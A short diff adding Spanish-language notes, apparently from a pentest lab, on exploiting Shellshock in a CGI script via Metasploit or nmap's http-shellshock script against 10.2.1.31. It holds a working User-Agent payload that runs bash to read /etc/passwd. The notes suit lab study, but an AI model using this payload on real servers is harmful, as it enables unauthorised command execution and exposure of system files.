@@ -1,0 +1,9 @@
+Si se obtiene un .cgi usar:
+  search shellshock
+  Luego buscar alguno de apache mod.
+  Modificar TARGETURI
+O usar:
+  nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=[PATH DEL CGI].cgi
+      === EXPLICACION ===
+La vulnerabilidad ocurre en USER-AGENT:
+  () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
